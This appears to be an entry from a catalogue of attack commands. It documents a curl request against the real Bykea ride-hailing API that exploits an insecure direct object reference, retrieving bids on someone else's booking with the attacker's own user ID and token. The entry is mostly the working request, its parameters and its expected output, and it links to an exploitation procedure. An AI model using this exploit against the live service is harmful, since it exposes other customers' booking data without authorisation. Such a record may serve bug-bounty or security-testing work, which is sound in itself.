---
data: >-
  curl -X GET
  "https://api.bykea.net/api/v2/bids/████████?_id={{user_id2}}&token_id={{access_token2}}"
  -H "User-Agent: BYKEA/1.0.169 (com.bykea.pk; build:21; iOS 15.8.0)
  Alamofire/1.0.169" -H "X-App-Version:1.0.169"
tags:
  - api
  - get
  - idor
type: command
output: >-
  {"code":200,"success":true,"data":{"bids":[],"dt":1707988055001,"is_discounted":false}}
executor: bash
platforms:
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:35.818Z'
id: 302afbd1-b6a9-402d-8768-150c1866e5a1
verified: false
validated: true
submitted: true
---
# bykea-get-bids

## Command

```bash
curl -X GET "https://api.bykea.net/api/v2/bids/████████?_id={{user_id2}}&token_id={{access_token2}}" \
  -H "User-Agent: BYKEA/1.0.169 (com.bykea.pk; build:21; iOS 15.8.0) Alamofire/1.0.169" \
  -H "X-App-Version:1.0.169"
```

## Description

Fetches bids for a booking in Bykea API, exploiting IDOR with foreign booking_id.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| booking_id | Target booking ID (path) | Yes |
| _id | Attacker's user ID (query) | Yes |
| token_id | Attacker's token (query) | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.bykea.net/api/v2/bids/████████?_id=...&token_id=..." -H "..."
```

### Advanced Usage

Test on active bookings for populated bids.

## Expected Output

{"code":200,"success":true,"data":{"bids":[] (or driver bids),"dt":1707988055001,"is_discounted":false}}.

## Related

- [[procedures/Exploit-IDOR-on-Bids-Information]]
